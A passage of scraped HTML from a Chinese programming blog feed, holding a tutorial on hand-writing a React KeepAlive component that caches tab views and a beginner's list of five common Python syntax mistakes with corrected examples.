                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 React 开发中，组件的<strong>频繁挂载和卸载</strong>往往会导致<strong>状态丢失和性能开销</strong>，尤其在 tab 切换或路由场景下。例如，当用户在不同视图间切换时，如果组件每次都重新渲染，内部的计数器、表单数据等状态就会重置，用户体验变差。为了解决这个问题，<code>React</code> 官方提供了 <code>&lt;KeepAlive&gt;</code> 组件，但理解其原理并手写实现，能帮助我们更深入掌握组件生命周期管理和状态缓存。本文将基于一个简单的计数器 tab 切换示例，详细讲解 <code>KeepAlive</code> 的手写过程。我们会使用对象作为缓存结构（类似于 Map），通过 <code>display</code> 属性<strong>控制组件显示隐藏</strong>，从而实现<strong>缓存活化</strong>。</p>
<h3 data-id="heading-0">KeepAlive 的核心原理</h3>
<p><code>KeepAlive</code> 的本质是<strong>缓存组件实例，避免卸载</strong>。它不像条件渲染（如 if 语句）那样销毁组件，而是将不活跃的组件“隐藏”起来，保留其状态。当切换回该组件时，直接显示即可，无需重新挂载。这涉及到 React 的渲染机制：组件可以通过 CSS 中 <code>display: none</code> <strong>隐藏</strong>，但仍保持在 DOM 中，生命周期钩子不会触发卸载。</p>
<p>为什么用缓存结构？因为需要存储多个组件。例如，在多 tab 场景下，每个 tab 对应一个组件，我们用一个键值对存储：key 为 tab ID，value 为组件 JSX。Map（ES6 新增的数据结构），它允许任意类型作为 key（如对象），而对象字面量的 key 只能是字符串。但在简单场景下，对象 {} 也能胜任，且更轻量。JSON 与此类似，都是 key-value，但 JSON 是字符串序列化形式，不适合直接作为缓存。</p>
<p>切换显示的逻辑：当 <code>activeId</code> 变化时，检查缓存中是否有对应组件；如果没有，添加当前 children；然后遍历缓存，渲染所有组件，但只显示 active 的那个。通过 Object.entries 将缓存转为二维数组 <code>[[key1, value1], [key2, value2]]</code>，便于 map 渲染。</p>
<p>这种设计提升了组件的复用性：父组件通过 <code>children</code> 传入任意内容，<code>KeepAlive</code> 只负责<strong>缓存和显示控制</strong>。props 如 <code>activeId</code> 用于标识当前活跃 tab。</p>
<h3 data-id="heading-1">示例场景：计数器 tab 切换</h3>
<p>假设我们有一个 <code>App</code> 组件，包含两个计数器视图 A 和 B。用户点击按钮切换 tab，我们希望切换时保留计数器状态，而不是重置为 0。以下是 <code>App.jsx</code> 的完整代码：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> {
  useState,
  useEffect,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">import</span> <span class="hljs-title class_">KeepAlive</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/KeepAlive.jsx'</span>;


<span class="hljs-keyword">const</span> <span class="hljs-title function_">Counter</span> = (<span class="hljs-params">{ name }</span>) =&gt; {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"挂载"</span>, name);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"卸载"</span>, name);
    }    
  }, [])

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{padding:</span> '<span class="hljs-attr">20px</span>', <span class="hljs-attr">border:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ccc</span>'}}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>{name} 视图<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>当前计数：{count}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;点击加1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">OtherCounter</span> = (<span class="hljs-params">{ name }</span>) =&gt; {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"挂载"</span>, name);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"卸载"</span>, name);
    }    
  }, [])

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{padding:</span> '<span class="hljs-attr">20px</span>', <span class="hljs-attr">border:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ccc</span>'}}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>{name} 视图<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>当前计数：{count}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;点击加1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}


<span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [activeTab, setActiveTab] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">'A'</span>);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{marginBottom:</span> '<span class="hljs-attr">20px</span>'}}&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setActiveTab('A')}&gt;显示A组件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setActiveTab('B')}&gt;显示B组件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      {/* children 提升组件的定制能力 给父组件方便 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">KeepAlive</span> <span class="hljs-attr">activeId</span>=<span class="hljs-string">{activeTab}</span>&gt;</span>
        { activeTab === 'A' ? <span class="hljs-tag">&lt;<span class="hljs-name">Counter</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"A"</span> /&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">OtherCounter</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"B"</span> /&gt;</span> }
      <span class="hljs-tag">&lt;/<span class="hljs-name">KeepAlive</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>
</code></pre>
<p>在这里，Counter 和 OtherCounter 是两个独立的计数器组件，使用 useEffect 记录挂载/卸载日志。App 通过 useState 管理 activeTab，按钮切换它。KeepAlive 包裹条件渲染的 children：当 activeTab 为 'A' 时渲染 Counter，否则 OtherCounter。</p>
<p>运行这个 App，如果没有 KeepAlive，切换 tab 时会看到控制台打印“卸载 A”和“挂载 B”，计数器重置。但有了 KeepAlive，只在首次渲染时挂载，以后切换只隐藏/显示，无卸载日志，状态保留。</p>
<h3 data-id="heading-2">手写 KeepAlive 组件</h3>
<p>现在，我们实现 KeepAlive.jsx。它使用 useState 存储缓存，useEffect 在 activeId 或 children 变化时更新缓存。渲染时遍历缓存，应用 display 样式。代码如下：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> {
  useState,
  useEffect,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">KeepAlive</span> = (<span class="hljs-params">{
  activeId,
  children,
}</span>) =&gt; {
  <span class="hljs-keyword">const</span> [cache, setCache] = <span class="hljs-title function_">useState</span>({});  <span class="hljs-comment">// 缓存组件的</span>
  <span class="hljs-comment">// console.log(children, "--------");</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// activeId updata 切换显示</span>
    <span class="hljs-comment">// children updata 保存</span>
    <span class="hljs-keyword">if</span> (!cache[activeId]) {  <span class="hljs-comment">// activeId key</span>
      <span class="hljs-title function_">setCache</span>(<span class="hljs-function">(<span class="hljs-params">pre</span>) =&gt;</span> ({
        ...pre,
        [activeId]: children
      }))
    }
    <span class="hljs-comment">// console.log(cache, "????????");</span>
  }, [activeId, children, cache])
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      {
        // Object.entries 对象变成数组
        // [key, value] 又方便使用
        Object.entries(cache).map(([id, components]) =&gt; (
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{id}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{display:</span> <span class="hljs-attr">id</span> === <span class="hljs-string">activeId</span> ? '<span class="hljs-attr">block</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">none</span>'}}
          &gt;</span>
            {components}
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        ))
      }
    <span class="hljs-tag">&lt;/&gt;</span></span>
  )
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">KeepAlive</span>
</code></pre>
<p>剖析代码：</p>
<ul>
<li>useState({}) 初始化 cache 为空对象。</li>
<li>useEffect 依赖 [activeId, children, cache]：当这些变化时，检查 cache 是否有 activeId；如果没有，添加 children 到 cache。</li>
<li>渲染部分：使用 Object.entries(cache) 转为 [[id, components]] 数组，map 渲染每个缓存项。每个项包裹在 div 中，key 为 id（确保唯一），style 根据 id === activeId 设置 display: block 或 none。</li>
<li>注释解释了 Object.entries 的作用：将对象拆成易迭代的二维数组。</li>
</ul>
<p>这个实现简单有效。首次切换到 'A' 时，cache 添加 {'A':  }，渲染 div display: block。切换 'B' 时，添加 {'B':  }，现在渲染两个 div：A 为 none，B 为 block。组件实例保留，状态不丢。</p>
<p>总结，手写 KeepAlive 考察了对 React 状态、effect 和渲染的理解。通过缓存和 display 控制，我们实现了高效组件复用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[新手必看｜5个Python基础语法避坑技巧（附代码示例）]]></title>    <link>https://juejin.cn/post/7602246300453126179</link>    <guid>https://juejin.cn/post/7602246300453126179</guid>    <pubDate>2026-02-03T09:30:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602246300453126179" data-draft-id="7602188264114962447" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="新手必看｜5个Python基础语法避坑技巧（附代码示例）"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-03T09:30:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="躺平大鹅"/> <meta itemprop="url" content="https://juejin.cn/user/2455634286221657"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            新手必看｜5个Python基础语法避坑技巧（附代码示例）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2455634286221657/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    躺平大鹅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T09:30:32.000Z" title="Tue Feb 03 2026 09:30:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作为刚入门编程的新手，Python基础语法看似简单，但很容易在细节上踩坑，导致代码报错、运行异常，既影响效率又打击积极性。今天整理了5个最常见的Python语法避坑点，搭配可直接复制运行的代码示例，新手看完就能避开90%的基础错误，快速夯实基础～</p>
<h3 data-id="heading-0">一、缩进错误（最高频！）</h3>
<p>Python的缩进不是“可选装饰”，而是语法的一部分，这和Java、C++的括号分隔不同，新手最容易忽略缩进规范，导致IndentationError。</p>
<p>❌ 错误示例：</p>
<pre><code class="hljs language-python" lang="python">a = <span class="hljs-number">10</span>
<span class="hljs-keyword">if</span> a &gt; <span class="hljs-number">5</span>:
<span class="hljs-built_in">print</span>(<span class="hljs-string">"a大于5"</span>)  <span class="hljs-comment"># 缩进不一致，报错</span>
    
</code></pre>
<p>✅ 正确示例：</p>
<pre><code class="hljs language-python" lang="python">a = <span class="hljs-number">10</span>
<span class="hljs-keyword">if</span> a &gt; <span class="hljs-number">5</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"a大于5"</span>)  <span class="hljs-comment"># 统一使用4个空格缩进（CSDN规范）</span>
    
</code></pre>
<p>💡 避坑技巧：固定使用4个空格缩进（不要用Tab键，避免不同编辑器显示异常），IDE（如PyCharm、VS Code）可设置“Tab自动转为4个空格”，从根源避免缩进问题。</p>
<h3 data-id="heading-1">二、变量命名规范（避免语法报错+提高可读性）</h3>
<p>Python变量命名有明确规则，新手容易使用关键字、特殊符号，导致代码无法运行，同时混乱的命名会让后续调试变得困难。</p>
<p>❌ 错误示例：</p>
<pre><code class="hljs language-python" lang="python">123name = <span class="hljs-string">"张三"</span>  <span class="hljs-comment"># 不能以数字开头</span>
name@age = <span class="hljs-number">20</span>    <span class="hljs-comment"># 不能包含@、#等特殊符号（下划线_除外）</span>
<span class="hljs-keyword">if</span> = <span class="hljs-number">5</span>           <span class="hljs-comment"># 不能使用关键字（if、for、while等）</span>
    
</code></pre>
<p>✅ 正确示例：</p>
<pre><code class="hljs language-python" lang="python">user_name = <span class="hljs-string">"张三"</span>  <span class="hljs-comment"># 小写字母+下划线（蛇形命名法，Python推荐）</span>
user_age = <span class="hljs-number">20</span>
flag = <span class="hljs-number">5</span>
    
</code></pre>
<h3 data-id="heading-2">三、中英文符号混淆（隐蔽性极强！）</h3>
<p>这是新手最容易踩的“隐形坑”，中英文的括号、引号、逗号看起来相似，但Python只识别英文符号，一旦用了中文符号，就会报SyntaxError，却很难快速找到问题所在。</p>
<p>❌ 错误示例：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-built_in">print</span>(“Hello Python”)  <span class="hljs-comment"># 中文双引号</span>
<span class="hljs-keyword">if</span> a == <span class="hljs-number">5</span>：            <span class="hljs-comment"># 中文冒号</span>
    
</code></pre>
<p>✅ 正确示例：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-built_in">print</span>(<span class="hljs-string">"Hello Python"</span>)  <span class="hljs-comment"># 英文双引号</span>
<span class="hljs-keyword">if</span> a == <span class="hljs-number">5</span>:            <span class="hljs-comment"># 英文冒号</span>
    
</code></pre>
<p>💡 避坑技巧：编程时固定切换到英文输入法，IDE可安装“中英文符号检测插件”，实时提醒错误。</p>
<h3 data-id="heading-3">四、列表/字典索引取值错误</h3>
<p>Python中列表、字典是最常用的数据结构，新手容易出现“索引越界”“字典键不存在”的错误，尤其是循环取值时。</p>
<p>❌ 错误示例：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 列表索引从0开始，不是1</span>
list1 = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]
<span class="hljs-built_in">print</span>(list1[<span class="hljs-number">4</span>])  <span class="hljs-comment"># 列表长度为4，最大索引是3，报错</span>

<span class="hljs-comment"># 字典取值时，键不存在报错</span>
dict1 = {<span class="hljs-string">"name"</span>:<span class="hljs-string">"张三"</span>, <span class="hljs-string">"age"</span>:<span class="hljs-number">20</span>}
<span class="hljs-built_in">print</span>(dict1[<span class="hljs-string">"gender"</span>])  <span class="hljs-comment"># 键gender不存在，报错</span>
    
</code></pre>
<p>✅ 正确示例：</p>
<pre><code class="hljs language-python" lang="python">list1 = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]
<span class="hljs-built_in">print</span>(list1[<span class="hljs-number">3</span>])  <span class="hljs-comment"># 取最后一个元素，索引3</span>

dict1 = {<span class="hljs-string">"name"</span>:<span class="hljs-string">"张三"</span>, <span class="hljs-string">"age"</span>:<span class="hljs-number">20</span>}
<span class="hljs-comment"># 方法1：判断键是否存在</span>
<span class="hljs-keyword">if</span> <span class="hljs-string">"gender"</span> <span class="hljs-keyword">in</span> dict1:
    <span class="hljs-built_in">print</span>(dict1[<span class="hljs-string">"gender"</span>])
<span class="hljs-comment"># 方法2：使用get()方法，不存在返回默认值None</span>
<span class="hljs-built_in">print</span>(dict1.get(<span class="hljs-string">"gender"</span>))
    
</code></pre>
<h3 data-id="heading-4">五、循环中修改可迭代对象（容易导致死循环/漏值）</h3>
<p>新手在for循环中，经常直接修改列表、字典等可迭代对象，导致循环次数异常、漏取元素，甚至死循环。</p>
<p>❌ 错误示例：</p>
<pre><code class="hljs language-python" lang="python">list1 = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]
<span class="hljs-comment"># 循环中删除列表元素，导致漏值</span>
<span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> list1:
    <span class="hljs-keyword">if</span> num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:
        list1.remove(num)
<span class="hljs-built_in">print</span>(list1)  <span class="hljs-comment"># 预期[1,3,5]，实际[1,3,5]（此处看似正确，复杂场景会漏值）</span>
    
</code></pre>
<p>✅ 正确示例：</p>
<pre><code class="hljs language-python" lang="python">list1 = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]
<span class="hljs-comment"># 遍历列表副本，修改原列表</span>
<span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> list1[:]:
    <span class="hljs-keyword">if</span> num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:
        list1.remove(num)
<span class="hljs-built_in">print</span>(list1)  <span class="hljs-comment"># 正确输出[1,3,5]</span>
    
</code></pre>
<h3 data-id="heading-5">最后</h3>
